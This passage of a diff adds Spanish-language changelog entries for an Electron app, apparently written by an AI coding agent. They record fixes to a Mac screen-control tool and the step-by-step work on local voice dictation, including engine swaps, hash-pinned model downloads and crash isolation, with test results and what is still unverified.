+    nunca se activa para ellas — es pura red de seguridad para las tarjetas.
+  - **Bug 2 (relacionado) — sin eso, un reintento de OpenCode podía superponerse con la llamada
+    original** (dos acciones de mouse/teclado reales corriendo a la vez). Se agregó una cola que
+    serializa TODA llamada a herramientas del MCP, una por vez — nunca dos acciones nativas
+    simultáneas, pase lo que pase.
+  - **Bug 3 — ninguna captura le decía al modelo qué app tenía en primer plano**: por eso el modelo,
+    correctamente, se negó a hacer clic cuando dos capturas (pantalla completa vs. solo la app)
+    mostraban cosas distintas — no tenía forma de saber cuál reflejaba la realidad. Ahora `screenshot`
+    (y el texto que acompaña cada captura automática tras una acción) dice explícitamente qué app está
+    en primer plano.
+  - **Bug 4 — `app_screenshot` (captura de UNA ventana) se devolvía como si fueran coordenadas de
+    pantalla completa, invitando a clicar sobre ella**: no hay forma de saber dónde está esa ventana
+    en la pantalla real (no se captura su posición), así que un píxel de esa imagen nunca se puede
+    convertir en un punto de clic. Se marcó explícito en la descripción de la herramienta y en cada
+    respuesta: "SOLO para mirar, NUNCA para sacar coordenadas de clic". De paso se encontró y sacó un
+    bug aparte: su resultado arrastraba una frase genérica ("Captura de la pantalla principal…") mal
+    puesta encima de su propio texto, que ya explicaba todo bien.
+  - **Bug 5 — `find_element` devolvía coordenadas en una unidad, `left_click` esperaba otra**:
+    `find_element` da las coordenadas de Accessibility en PUNTOS de pantalla; `left_click` (como el
+    resto de las herramientas de acción) espera PÍXELES de la última captura y las convierte él mismo
+    multiplicando por la proporción — pasarle un punto de AX directo (lo que el propio prompt de la
+    herramienta invitaba a hacer) las convertía DOS veces, y el clic caía desviado, más lejos cuanto
+    más al fondo/derecha de la pantalla. Arreglado en el origen: ahora `find_element`/`list_elements`
+    convierten a píxeles ANTES de mostrarlas, así "pasá estas coordenadas directo" (lo que ya decía el
+    prompt) es cierto sin tener que explicarle al modelo una conversión más.
+  - **Deliberadamente fuera de esta tanda** (anotado para la próxima, no se tocó): la lista de "apps
+    que nunca se ocultan" en modo segundo plano incluye TODA app concedida alguna vez (no solo las de
+    la tarea actual) — por eso Discord seguía visible; verificación de que la app en primer plano
+    coincide con el objetivo antes de clicar/tipear (el caso del "casi" de WhatsApp de Claude);
+    tratamiento especial de apps de solo-píxeles (escritorios remotos, VMs); ritmo de espera más
+    inteligente; límite de tiempo en las llamadas de Accessibility; corrección multi-monitor. Son
+    cambios de más riesgo/alcance (tocan el sistema de concesiones o el helper nativo en Swift) — se
+    dejan para una vuelta aparte, no mezclados con esta tanda ya grande.
+- **Verificado**: typecheck (los 4) limpio, lint limpio. Batería de `src/main/computer` completa en
+  verde — 314 pruebas (antes 1 falla nueva por plataforma: Windows, por el nuevo llamado `frontmost`
+  en paralelo a cada captura, actualizada; la "caracterización" del MCP —fixture de oro que graba
+  byte a byte lo que se le pide al helper y lo que se le devuelve al modelo— regenerada A PROPÓSITO
+  con `UPDATE_CU_FIXTURE=1` tras revisar el diff completo línea por línea, confirmando que CADA cambio
+  es exactamente el que se buscaba, ninguno accidental). Batería completa del repo en verde — 5877
+  pruebas (23 skipped, Windows-only), mismo ruido ajeno de siempre (`ENOEXEC` en Mac).
+- **No verificado todavía — requiere interacción real en una tarea de verdad con una app/ventana
+  real**: que el dueño confirme que el flujo completo (plan → tarjeta → control → acción) ya no se
+  cae por timeout, y que las capturas/coordenadas nuevas se sienten más confiables.
+
+## F8-B141 — Dictado por voz en Chat/Code/Tareas (100% local, Whisper)
+
+- **El dueño pidió, en paralelo a lo de Cowork**: poder hablar y que se transcriba, en los tres modos.
+  Se investigó primero si convenía el reconocimiento de voz nativo del navegador
+  (`webkitSpeechRecognition`, cero configuración) — confirmado que NO funciona de forma confiable en
+  Electron (Google le exige una clave propia de Chrome de verdad al servicio, que Electron no trae; es
+  un problema reportado, no una suposición). El dueño después aclaró que no quería depender de una
+  cuenta/clave nueva — mismo criterio que ya había pedido para las fotos — así que se descartó
+  cualquier servicio en la nube y se fue directo a **local de verdad**.
+  - **Motor**: `@huggingface/transformers` (sucesor activo de `@xenova/transformers`, que quedó
+    discontinuado) corriendo Whisper vía ONNX Runtime — SIN compilar ni firmar un binario propio por
+    plataforma (a diferencia del helper de Control del Mac, que si lo necesita): es una dependencia de
+    npm normal, Mac y Windows cruzan solos. El audio NUNCA sale de la máquina.
+  - **Modelo**: `Xenova/whisper-base`, MULTILINGÜE a propósito (nunca una variante "-en": esta app se
+    usa en español) — se descarga una sola vez (~145 MB) desde Hugging Face Hub la primera vez que se
+    usa, Transformers.js lo cachea solo en `userData` entre arranques. Esa primera vez sí necesita red;
+    de ahí en adelante funciona sin conexión, mismo criterio que el resto de lo "local" de esta app. No
+    viene empaquetado en el instalador (lo mantiene chico).
+  - **Pipeline del audio, todo con APIs web de siempre, sin dependencias nuevas de audio**:
+    `getUserMedia`/`MediaRecorder` graban (el permiso de micrófono ya estaba declarado —
+    `NSMicrophoneUsageDescription` en `electron-builder.js`, de la grabadora de skills de Control del
+    Mac); al cortar, se decodifica con `AudioContext.decodeAudioData` y se remuestrea a PCM mono de
+    16 kHz (lo que Whisper espera) con interpolación lineal propia — de sobra para voz, sin arrastrar
+    ninguna librería de audio. Eso se manda a main (`extras:transcribeAudio`, nuevo canal IPC,
+    clasificado `'X'` en `remote/policy.ts`), que corre Whisper y devuelve el texto.
+  - **Un solo hook y un solo botón, compartidos por los tres modos**: `useVoiceDictation` (grabar →
+    transcribir) + `VoiceDictationButton` (ícono de micrófono, un clic graba, otro corta y transcribe)
+    — cada composer (`ChatComposer.tsx`, Code's `Composer.tsx` ×2 — tiene diseño de escritorio y de
+    celular por separado —, `TasksComposer.tsx`) solo aporta un `insertDictated` que mete el texto en
+    la posición del cursor, mismo patrón que ya usaba el botón de "@" de Code.
+  - **Empaquetado**: `onnxruntime-node` (el runtime de ONNX) y `sharp`/`@img/*` (dependencia de
+    `@huggingface/transformers`) traen binarios nativos por plataforma adentro del propio paquete de
+    npm — se agregaron a `asarUnpack` en `electron-builder.js` (mismo motivo y mismo patrón que ya
+    existía ahí para `@node-datachannel`, el addon de WebRTC del control remoto): un `.node` no puede
+    cargarse desde adentro del `.asar`.
+  - **Bug real encontrado al escribir las pruebas, no relacionado con la voz pero destapado por ella**:
+    `getExtras()` (`src/renderer/src/lib/extrasApi.ts`) asumía que `window` siempre existe —
+    `window.api?.extras`. Hay pruebas de contenido (`*.render.test.tsx`) que renderizan con
+    `renderToStaticMarkup`, un SSR de verdad SIN ningún `window` global — ahí tira `ReferenceError`, no
+    `undefined`. Ningún botón existente lo había destapado porque ninguno se renderizaba en ese camino
+    SSR en particular; el de voz, al sumarse al composer de Tareas, sí. Arreglado con un
+    `typeof window === 'undefined'` al principio — beneficia a TODO lo que ya usa `getExtras()`, no
+    solo al botón nuevo.
+  - **Bug de pruebas (no de producto) encontrado al verificar F8-B140 otra vez**: la prueba de Windows
+    que fija el orden exacto de llamadas al helper durante una captura asumía un orden fijo entre
+    `frontmost` y `list-apps` — pero esas dos corren EN PARALELO (`Promise.all`, ver F8-B140) y su
+    orden relativo no es determinista entre corridas. Se reescribió para solo pedir que `frontmost`
+    pase en algún punto temprano (entre "session" y "screenshot"), nunca una posición fija — confirmado
+    estable en 6 corridas seguidas.
+- **Pruebas nuevas**: `voice-transcribe.test.ts` (6, con `@huggingface/transformers` mockeado:
+  audio vacío nunca carga el modelo, carga el pipeline con un modelo MULTILINGÜE de verdad —no uno
+  "-en"—, el pipeline se carga UNA sola vez aunque se transcriba varias veces, un resultado sin texto
+  da `''`, el audio se recorta a 120s antes de mandarlo, y un fallo de carga (p.ej. sin red la primera
+  vez) permite reintentar en la próxima llamada en vez de quedar pegado al error).
+- **Verificado**: typecheck (los 4) limpio, lint limpio (mismos 8 warnings preexistentes). Batería
+  completa del repo en verde — 5884 pruebas (23 skipped, Windows-only), mismo ruido ajeno de siempre
+  (`ENOEXEC` en Mac). App reiniciada (con la dependencia nueva, Vite re-optimizó solo, sin errores).
+- **No verificado todavía — requiere interacción real con micrófono y descarga de verdad**: que el
+  dueño pruebe dictar en los tres modos, confirme que el permiso de micrófono de macOS aparece bien,
+  que la descarga del modelo la primera vez termine sin problema, y que la calidad de la transcripción
+  en español alcance para lo que necesita (si no, el ajuste más simple es subir a `whisper-small`, más
+  preciso y más pesado — un solo identificador de modelo para cambiar en `voice-transcribe.ts`).
+
+## F8-B142 — El micrófono no andaba: faltaba en la lista blanca de permisos de Electron
+
+- **El dueño probó F8-B141 y el botón de micrófono no hacía nada** — causa real, no un bug del
+  pipeline de audio: `security/web-security.ts` (endurecimiento global de Electron, AUDIT.md 2.1/S8)
+  deniega TODOS los permisos de la sesión por defecto salvo una lista blanca explícita
+  (`notifications`, `clipboard-sanitized-write`) — `media` (lo que pide `getUserMedia`) no estaba, así
+  que Electron lo rechazaba él mismo, ANTES de que el sistema operativo llegara a mostrar su propio
+  diálogo de permiso. Era una decisión de seguridad deliberada y auditada (el propio `AUDIT.md` decía
+  "probado: micrófono denegado"), no un descuido — había que tocarla a propósito, no solo en el código.
+  - Agregado `'media'` a la lista blanca (`ALLOWED_PERMISSIONS`), con el mismo criterio que ya aplica
+    a los otros dos: SOLO para páginas propias en el frame principal (`isTrustedUrl`) — un artifact o
+    el visor (sesiones aparte, con su propio `setPermissionRequestHandler` que deniega TODO) siguen
+    sin poder pedir el micrófono, sin cambios ahí. Electron no distingue "micrófono" de "cámara" a
+    este nivel (`media` cubre ambos) — esta app nunca pide video, así que en la práctica solo habilita
+    audio; el sistema operativo igual pregunta la primera vez (ese diálogo no lo toca este cambio).
+  - `AUDIT.md` actualizado en el mismo lugar que documentaba lo viejo (tabla 2.1), para que la
+    documentación de seguridad no quede mintiendo sobre el estado real.
+- **Verificado**: typecheck limpio, lint limpio, las pruebas de `security/web-security.*` (las únicas
+  que tocan este archivo — ninguna fija la lista exacta de permisos, así que no hacía falta
+  actualizar ninguna) siguen en verde. App reiniciada.
+- **No verificado todavía**: que el dueño confirme que ahora sí aparece el diálogo de permiso de
+  micrófono de macOS al apretar el botón, y que después de concederlo el dictado funciona de punta a
+  punta.
+
+## F8-B143 — Dictado: "tarda muchísimo" + "funciona pésimo" (más preciso + avisa que está descargando)
+
+- **El dueño, ya con el permiso de micrófono andando**: "funciona pésimo" — dos quejas separadas,
+  confirmadas por él mismo al preguntarle: el texto transcrito no se entiende bien, y además tarda
+  muchísimo. No había forma de saber CUÁL de las dos causas pesaba más sin arreglar ambas:
+  - **"Tarda muchísimo" → probablemente la descarga del modelo (~145 MB la primera vez) sin ningún
+    aviso**: antes de esto, apretar el botón se sentía exactamente igual estuviera transcribiendo (unos
+    segundos) o descargando el modelo por primera vez (podía ser varios minutos según la conexión) —
+    mismo ícono de "cargando", sin ninguna señal de cuál de las dos cosas estaba pasando.
+    `@huggingface/transformers` expone un `progress_callback` de verdad (porcentaje agregado de todos
+    los archivos del modelo) — se conectó: ahora el botón muestra "Bajando el modelo de voz (una sola
+    vez)… 42%" en vez de solo girar. Solo pasa la primera vez; de ahí en adelante es inmediato.
+  - **"No se entiende" → subido de `whisper-base` a `whisper-small`**: el tamaño "base" es sabido que
+    pierde bastante precisión en idiomas no ingleses frente a "small" — para una app que se usa en
+    español, era la causa más probable. A cambio pesa más (~244 MB en vez de ~145 MB, siempre la
+    primera vez) y tarda un poco más por transcripción — con el aviso de descarga de arriba, al menos
+    la espera ahora se entiende. Si igual no alcanza o resulta muy lento en la práctica, es un solo
+    identificador de modelo para tocar en `voice-transcribe.ts` (`MODEL_ID`).
+  - **De paso, se separó `voice-transcribe.ts` del resto de `extras/`**: al principio importaba
+    `broadcastExtras` directo de `extras/index.ts` para avisar el progreso — mismo problema ya visto
+    con `slides-deck-export.ts` esta sesión: esa cadena de imports arrastra `app.isPackaged` de
+    Electron, y las pruebas (sin Electron real) explotaban. Arreglado igual que aquella vez:
+    `voice-transcribe.ts` queda puro (solo avisa por un callback propio, `onVoiceModelProgress`), y es
+    `extras-handlers.ts` (que ya vive en el mundo de Electron) el que conecta ese callback con
+    `broadcastExtras` — nuevo evento IPC `extras:voiceModelProgress`, clasificado `deny` en
+    `remote/policy.ts` (el dictado nunca pasa por el celular, no hay micrófono del Mac ahí).
+- **Pruebas nuevas**: 2 más en `voice-transcribe.test.ts` (8 en total) — `onVoiceModelProgress` avisa
+  a quien escucha con cada actualización de descarga y al terminar, y la des-suscripción de verdad deja
+  de avisar.
+- **Verificado**: typecheck (los 4) limpio, lint limpio. Batería completa del repo en verde — 5886
+  pruebas (23 skipped, Windows-only), mismo ruido ajeno de siempre (`ENOEXEC` en Mac). `policy.test.ts`
+  (cobertura 100% de EVENTOS esta vez, no solo canales — encontró el evento nuevo sin clasificar) y
+  `i18n-core.test.ts` en verde con lo nuevo. App reiniciada.
+- **No verificado todavía**: que el dueño confirme que ahora sí avisa mientras descarga y que la
+  calidad en español mejoró lo suficiente con `whisper-small`.
+
+## F8-B144 — "Se cerró la app sola": el dictado tenía un crash NATIVO real, aislado en proceso aparte
+
+- **El dueño, probando el dictado ya con `whisper-small`**: "se cerro la app sola XD" — toda la app
+  (no solo el dictado) se cerró de golpe. No se le pidió más detalle: el reporte de crash de macOS era
+  suficiente para diagnosticarlo solo.
+  - `pgrep` confirmó que el proceso de Electron estaba muerto de verdad (no colgado). El log de dev
+    (`/tmp/lazunox-dev.log`) no tenía nada útil, pero macOS guarda un reporte de crash real en
+    `~/Library/Logs/DiagnosticReports/` — se encontró `Electron-2026-10-08-195746.ips`, se parseó a
+    mano (cabecera JSON + cuerpo JSON) y dio la causa exacta: **`EXC_BREAKPOINT`/`SIGTRAP` nativo
+    DENTRO de `libonnxruntime.1.dylib`**, en medio de una inferencia real de Whisper
+    (`BFCArena::Extend` → `operator new` → … → `Softmax::Compute` → `InferenceSession::Run`). Es decir:
+    no un error de JavaScript (ningún `try/catch` lo agarra nunca — un crash nativo mata el proceso
+    entero que lo contiene), sino un fallo real del motor ONNX Runtime corriendo DENTRO del proceso
+    principal de Electron, que se lleva toda la app con él.
+- **Arreglo: el dictado se mudó a un `utilityProcess` aparte**, el mismo patrón ya probado en este
+  código para Control del Mac (`computer/mcp-server.ts` + `mcp-host.ts`):
+  - `src/main/extras/voice-worker.ts` (nuevo): entry point autocontenido de un build nuevo
+    (`out/main/voice-worker.js`, agregado a `electron.vite.config.ts`), importa SOLO
+    `voice-transcribe.ts` (puro, sin nada de Electron) — recibe `{type:'transcribe', id, samples}` por
+    `process.parentPort`, corre `transcribeAudio`, devuelve `{type:'result'|'error', id, ...}`.
+  - `src/main/extras/voice-worker-host.ts` (nuevo): `VoiceWorkerHost`, vive en el proceso principal.
+    Arranca el worker recién la primera vez que hace falta transcribir (no al abrir la app), con
+    protocolo de "listo" (timeout 15 s) y correlación de pedidos por id numérico (soporta varios
+    pedidos en simultáneo). A diferencia del MCP de Control del Mac (que tiene que estar siempre
+    disponible, con reintento automático), acá alcanza con relanzar en la SIGUIENTE llamada a
+    `transcribe()` si el proceso murió — no hay bucle de fondo.
+  - Si el worker muere a mitad de una transcripción (crash nativo incluido — el motivo de todo esto):
+    lo pendiente falla con un mensaje claro ("probá de nuevo") en vez de quedarse colgado para siempre,
+    y la próxima vez que se use el micrófono el worker se levanta solo de nuevo. Lo peor que puede pasar
+    ahora es que esa transcripción puntual falle — nunca que se cierre la app entera.
+  - `extras-handlers.ts` reemplaza las llamadas directas a `transcribeAudio`/`onVoiceModelProgress` por
+    `VoiceWorkerHost`, con `app.on('before-quit', () => voiceWorker.dispose())` para no dejar el
+    proceso chico huérfano al cerrar.
+- **Sin pruebas unitarias nuevas para `VoiceWorkerHost`/`voice-worker.ts`**: igual que el `ComputerMcpHost`
+  equivalente (tampoco tiene test propio en este repo — se verifica con el MCP real corriendo), mockear
+  `utilityProcess.fork()` de Electron de forma fiel no daba suficiente valor frente al costo; la lógica
+  real (transcribir, reportar progreso) sigue cubierta por los 8 tests ya existentes de
+  `voice-transcribe.test.ts`, intactos porque ese archivo no cambió, solo su forma de ser invocado.
+- **Verificado**: typecheck (los 4 proyectos) limpio, lint limpio, `out/main/voice-worker.js` se genera
+  en el build (3.33 kB). Batería completa del repo en verde — 5886 pruebas, 23 skipped (Windows-only),
+  mismo ruido ajeno de siempre (`ENOEXEC` en Mac, no relacionado). App reiniciada con el fix.
+- **No verificado todavía**: que el dueño dicte de nuevo y confirme en la práctica que un fallo del
+  motor de voz ya no se lleva la app — eso requiere volver a provocarlo o usarlo lo suficiente como
+  para confiar en que, si pasa, ahora queda contenido.
+
+## F8-B145 — Dictado: "ahora no transcribio nada XD" — se cambió el motor entero (whisper.cpp, no ONNX)
+
+- **El dueño, apenas aislado el crash de F8-B144**: "ahora no transcribio nada XD" — el proceso aparte
+  ya no se llevaba la app entera (la isolación funcionó: el reporte de crash de macOS esta vez fue del
+  proceso "Electron Helper", no de "Electron"), pero el crash nativo en sí seguía pasando DENTRO de ese
+  proceso chico, así que la transcripción puntual fallaba igual. Pedido explícito del dueño: "investiga
+  en internet la mejor forma de hacerlo, claude lo hace al instante" — no parchar más onnxruntime-node,
+  buscar la causa de fondo y una alternativa mejor.
+- **Investigado (no inventado)**: el patrón del crash (`EXC_BREAKPOINT` dentro de `libonnxruntime.1.dylib`,
+  justo después de un frame de `libc++abi.dylib`) coincide con un problema conocido y documentado de
+  onnxruntime-node: cuando el allocador de memoria (`BFCArena::Extend`) no puede reservar lo que
+  necesita, lanza una excepción C++ en vez de devolver un error — si esa excepción cruza el binding de
+  Node sin ser atrapada, termina en `std::terminate`/abort (reportes reales:
+  [microsoft/onnxruntime#24264](https://github.com/microsoft/onnxruntime/issues/24264), caso similar
+  documentado en [discuss.huggingface.co](https://discuss.huggingface.co/t/got-onnxruntimeerror-when-try-to-run-bart-in-onnx-format-12851/8945)
+  donde bajar de versión "arregla" el síntoma pero no la causa). Es una debilidad real de esa librería
+  corriendo Whisper, no algo propio de esta app.
+- **Cambio de motor: `@huggingface/transformers`/onnxruntime-node → `smart-whisper-electron`
+  (whisper.cpp nativo, con Metal en Apple Silicon)**. Confirmado con el dueño antes de meterse (cambio
+  grande, no un parche) — ver pregunta respondida: cambiar de motor, no seguir mitigando ONNX.
+  whisper.cpp no tiene este patrón de crash reportado y además corre mucho más rápido en Apple Silicon
+  (GPU Metal real, no solo CPU/WASM) — también resuelve de raíz la otra queja de F8-B143
+  ("funciona pésimo"/"tarda muchísimo").
+  - `src/main/extras/voice-transcribe.ts`: reescrito para usar `smart-whisper-electron` en vez de
+    `@huggingface/transformers`. Sigue siendo un módulo PURO (sin Electron) y mantiene exactamente la
+    misma firma pública (`transcribeAudio`, `onVoiceModelProgress`) — `voice-worker.ts`/
+    `voice-worker-host.ts` no necesitaron tocarse en su protocolo.
+  - **Descarga del modelo con integridad real, no solo "confiar en el servidor"**: nuevo
+    `src/main/util/pinned-fetch.ts` (`downloadPinnedFile`, genérico, reusable), mismo criterio que ya
+    usa `tasks/backends/pinned-download.ts` — tamaño y SHA-256 EXACTOS fijados en el código (sacados
+    de verdad de la API de Hugging Face, no inventados: `ggml-small.bin`, 487 601 967 bytes, SHA-256
+    `1be3a9b2…fffea987b`), escribe a `.part` y recién renombra si todo coincide; una descarga a medias
+    o corrupta nunca queda como si fuera un modelo válido. A diferencia de `pinned-download.ts`, sin su
+    lista cerrada de hosts de GitHub: Hugging Face redirige a su propia CDN con dominios que varían
+    (confirmado con un `HEAD` real: redirige a `us.aws.cdn.hf.co`), así que el candado real acá es el
+    hash final, no una lista de dominios.
+  - **Metal en un `.asar` empaquetado**: whisper.cpp busca su shader (`ggml-metal.metal`) en el disco en
+    tiempo de ejecución, nunca embebido en el binario — dentro de un `.asar` no lo encuentra solo.
+    `voice-worker-host.ts` le pasa la carpeta real (desempaquetada) por la variable
+    `GGML_METAL_PATH_RESOURCES` al arrancar el proceso — sin esto, Metal fallaría SOLO en producción
+    (en `npm run dev`, sin asar, no se nota). `electron-builder.js`: `asarUnpack` cambia las entradas de
+    `onnxruntime-node`/`sharp`/`@img` (ya no existen) por `node_modules/smart-whisper-electron/**`.
+  - `package.json`: sacado `@huggingface/transformers` (y de paso sus dependencias transitivas
+    `onnxruntime-node`/`sharp`/`@img/*`, ya no usadas en ningún otro lado — confirmado con
+    `npm ls` antes de tocar nada), agregado `smart-whisper-electron`.
+- **Verificación real de punta a punta, no solo mocks**: se bajó el modelo de verdad (487 601 967
+  bytes, SHA-256 verificado a mano con `shasum`, coincide exacto) y se corrió una inferencia real con
+  el addon nativo ya compilado, bajo el mismo runtime de Node que usa Electron (`ELECTRON_RUN_AS_NODE=1`,
+  para descartar un desajuste de ABI entre el Node del sistema que compiló el addon y el Node embebido
+  de Electron que lo tiene que cargar después) — detectó la GPU (Apple M4, Metal), cargó el modelo en
+  ~220 ms y transcribió sin crashear. `pinned-fetch.ts` tiene 7 pruebas nuevas (tamaño/hash correctos,
+  tamaño/hash incorrectos, ya cacheado no vuelve a bajar, servidor manda de más, etc.) y
+  `voice-transcribe.test.ts` se reescribió para mockear `smart-whisper-electron`/`pinned-fetch` en vez
+  de `@huggingface/transformers` (mismos 8 casos de antes + 1 nuevo, todos en verde). Typecheck (los 4
+  proyectos) limpio, lint limpio, batería completa — 5893 pruebas, 23 skipped (Windows-only), mismo
+  ruido ajeno de siempre (`ENOEXEC` en Mac). App reiniciada con el motor nuevo; el modelo quedó
+  pre-descargado en `userData/models/whisper/` para que la primera prueba real del dueño no tenga que
+  esperar la descarga de 465 MB.
+- **No verificado todavía**: que el dueño dicte voz REAL (habla, no el tono sintético usado en la
+  prueba de arriba) desde Chat/Code/Tareas y confirme que ahora sí transcribe, rápido y sin crashear.
+
+## F8-B146 — Dictado más rápido: `greedy` + `flash_attn` (medido, no adivinado)
+
+- **El dueño, ya con whisper.cpp andando**: "se podrá hacer más rápido aún la transcripción y que sea
+  más correcta, más precisa — investiga en internet". Antes de tocar nada se armó un benchmark real
+  (audio en español generado con `say` de macOS, no un tono sintético) comparando la config actual
+  contra las dos palancas que la investigación señaló como más prometedoras para whisper.cpp:
+  decodificación `greedy` en vez del `beam_search` por defecto, y `flash_attn` (Metal).
+  - Resultado medido (misma frase, mismo modelo "small"): **1374 ms → 890 ms (-35%)**, y de paso
+    `greedy` transcribió la frase COMPLETA mientras que `beam_search` por defecto le cortó las últimas
+    dos palabras — o sea, acá no hubo contra ninguno, ganó en los dos ejes a la vez. Investigación que
+    lo respalda: el beam search de Whisper gana menos de 1-2 puntos de WER frente a greedy en la
+    mayoría de los idiomas y a veces ni eso
+    ([discusión de Hugging Face](https://discuss.huggingface.co/t/how-do-you-use-beam-search-in-whisper-correctly/131244),
+    [benchmark en pashto](https://arxiv.org/pdf/2604.04598)); `flash_attn` en Metal reduce el tiempo de
+    encoder ~15% sin pérdida de precisión medida (notas de release whisper.cpp v1.6.0). Las dos quedan
+    prendidas siempre en `voice-transcribe.ts` (`loadWhisper`/`transcribeAudio`) — sin flag, sin
+    decisión que pedirle al dueño, porque no tienen contra.
+  - **Pruebas**: el mock de `smart-whisper-electron` en `voice-transcribe.test.ts` ahora también expone
+    `WhisperSamplingStrategy` (la llamada real a `transcribe()` ahora manda `strategy` explícito).
+- **Lo que SÍ tiene contra, y se lo paso al dueño en el chat en vez de decidirlo solo**: para la parte
+  de "más precisa" se probó además `ggml-large-v3-turbo-q5_0` (modelo grande cuantizado, misma familia
+  que `large-v3`, 574 MB) contra la misma frase — transcribió PERFECTO (el "small" actual le erró una
+  palabra: "dedicado" en vez de "de dictado"), pero tardó 3361 ms (2.4x más lento que el "small" con
+  greedy). Es una mejora real de precisión a costa real de velocidad, no algo que se pueda decidir sin
+  el dueño — queda pendiente de que él elija.
+- **Verificado**: typecheck limpio, lint limpio, batería completa — 5893 pruebas en verde (mismo ruido
+  ajeno `ENOEXEC`). App reiniciada con `greedy`+`flash_attn` ya activos sobre el modelo "small" actual.
+- **Decisión del dueño sobre el modelo**: "¿habrá algo mejor que sea rápido y bueno y liviano?" — se
+  probó un tercer candidato, `ggml-medium-q5_0` (539 MB, apenas más pesado que "small"), con 3 frases
+  distintas en español (no solo una): acertó las 3, contra 1 de 3 del "small" actual, a cambio de
+  ~2.5x más latencia (~2 s vs ~0.8 s por frase) — mejor balance medido que `large-v3-turbo-q5_0`
+  (574 MB, ~3.4 s, mismo 0 errores pero más lento y más pesado). El dueño eligió cambiar a
+  `medium-q5_0`. `voice-transcribe.ts`: las 4 constantes del modelo (`MODEL_URL`/`MODEL_FILENAME`/
+  `MODEL_SIZE`/`MODEL_SHA256`) actualizadas a sus valores reales (sacados de la API de Hugging Face,
+  verificados con `shasum` a mano, no inventados). Modelo viejo (`ggml-small.bin`) borrado de
+  `userData/models/whisper/` y el nuevo (`ggml-medium-q5_0.bin`) pre-descargado ahí mismo, mismo
+  criterio que la vez anterior — la primera prueba real del dueño no tiene que esperar la descarga.
+- **Verificado (de nuevo, con el modelo nuevo)**: typecheck limpio, lint limpio, los 8 tests de
+  `voice-transcribe.test.ts` en verde (el que comprobaba el nombre de archivo del modelo actualizado).
+  App reiniciada.
+- **No verificado todavía**: que el dueño confirme en uso real (dictando de verdad, no con frases de
+  prueba sintéticas) que la mejora de precisión se nota y que la latencia nueva (~2 s) se siente bien.
+
+## F8-B147 — Dictado "casi instantáneo" de verdad: tercer motor, sherpa-onnx (y resuelve Windows)
+
+- **El dueño, con medium-q5_0 ya andando**: "investiga en internet, debe haber algo mejor y más rápido
+  casi a instante". Primero se probó la única palanca que quedaba dentro de whisper.cpp (`audio_ctx`
+  reducido, para no procesar de más en audios cortos) — **crasheó de verdad** con un assert nativo de
+  Metal (`GGML_ASSERT(nb01 % 8 == 0) failed`, abortó el proceso), descartada antes de tocar nada real.
+  Con whisper.cpp ya sin más palancas seguras, se investigó el motor nativo de dictado de macOS
+  (Speech framework) — más preciso que whisper en un benchmark real, pero exige escribir un módulo en
+  Swift desde cero y **solo funciona en Mac**. El dueño lo frenó por eso mismo: "no nos sirve porque
+  para Windows quedaremos tirados" — corregido, es la razón correcta para no encararlo así.
+- **La solución real: `sherpa-onnx-node`** — motor de reconocimiento de voz (Next-gen Kaldi, Apache-2.0,
+  N-API así que no hace falta recompilar para Electron) con binarios YA PRECOMPILADOS en npm para las
+  tres plataformas (`sherpa-onnx-darwin-arm64`, `sherpa-onnx-win-x64`, `sherpa-onnx-linux-x64`, como
+  `optionalDependencies` — `npm install` instala solo el que corresponde al sistema, sin compilar
+  nada). Con un modelo Zipformer en streaming para español (proyecto comunitario Kroko, gratis,
+  156 MB en total — mucho más chico que cualquiera de los anteriores).
+- **Medido con audio real en español antes de tocar nada de la app** (misma disciplina que las rondas
+  anteriores — nunca se asumió que "debía" ser mejor):
+  - 3 frases de prueba: **~100-120 ms por frase** (vs ~2000 ms de whisper.cpp medium-q5_0 — 17x más
+    rápido), 0 errores de palabras (solo faltan los signos de puntuación, que este tipo de modelo no
+    pone — característica, no bug).
+  - Frase larga (17.1 s de audio): 351-515 ms, texto exacto palabra por palabra salvo las últimas 1-2
+    palabras — **se investigó por qué** (no se dejó así): el patrón oficial de sherpa-onnx manda 0.4 s
+    de silencio de cola antes de drenar la decodificación; con 2 s de cola el resultado coincidió EXACTO,
+    sin faltar ninguna palabra, en todas las pruebas (frases cortas, la frase larga, y el caso límite).
+    Quedó en `TAIL_SILENCE_SECONDS = 2` en el código, documentado el por qué.
+  - Casos límite probados sin que nada rompiera nunca: audio vacío, audio de 50 ms, 3 s de silencio
+    puro, 2 s de ruido aleatorio, un buffer con `NaN` adentro (entrada corrupta a propósito), y 10
+    transcripciones seguidas con el mismo reconocedor (reuso real) — todo controlado, cero crashes.
+  - Prueba de punta a punta por el `voice-worker.js` REAL compilado (no solo la librería suelta),
+    simulando el protocolo de `parentPort` tal cual lo usa `voice-worker-host.ts`: arrancó, avisó
+    `ready`, transcribió una frase real grabada con `say`, devolvió el resultado y cerró limpio.
+- **Cambios de código**:
+  - `src/main/extras/voice-transcribe.ts`: reescrito para `sherpa-onnx-node` (`OnlineRecognizer` +
+    `OnlineStream`, decodificación streaming con `greedy_search`, `enableEndpoint: false`). Sigue
+    siendo un módulo PURO (sin Electron). Los 4 archivos del modelo (encoder/decoder/joiner/tokens) se
+    descargan en paralelo vía `downloadPinnedFile`, cada uno con su tamaño y SHA-256 real pinneado
+    (sacados de la API de Hugging Face, verificados a mano con `shasum`).
+  - `src/main/extras/sherpa-onnx-node.d.ts` (nuevo): el paquete no trae tipos propios — declaración
+    ambient mínima, solo con la parte de la API que se usa.
+  - `src/main/extras/voice-worker-host.ts`: sacada toda la lógica específica de Metal
+    (`GGML_METAL_PATH_RESOURCES`, ya no aplica — sherpa-onnx corre en CPU, nada de shaders que
+    desempacar); variable de entorno renombrada a `LAZUNOX_VOICE_MODEL_DIR` (ya no es específica de
+    Whisper), carpeta de caché ahora `userData/models/voice/`.
+  - `electron-builder.js`: `asarUnpack` cambia `smart-whisper-electron/**` por
+    `sherpa-onnx-node/**` + `sherpa-onnx-*/**` (cubre el paquete del addon nativo y el paquete de
+    binario por plataforma que `npm install` haya resuelto).
+  - `package.json`: sacado `smart-whisper-electron`, agregado `sherpa-onnx-node`.
+  - El `utilityProcess` aparte (F8-B144) se mantiene aunque este motor no mostró ningún crash en las
+    pruebas — aislamiento gratis, no cuesta nada seguir teniéndolo por si un motor futuro sí falla.
+- **Pruebas**: `voice-transcribe.test.ts` reescrito (9 casos: antes mockeaba `smart-whisper-electron`,
+  ahora mockea `sherpa-onnx-node` — incluye un caso nuevo que confirma que SIEMPRE se manda la cola de
+  silencio después del audio real).
+- **Verificado**: typecheck (los 4 proyectos) limpio, lint limpio, batería completa — 5894 pruebas en
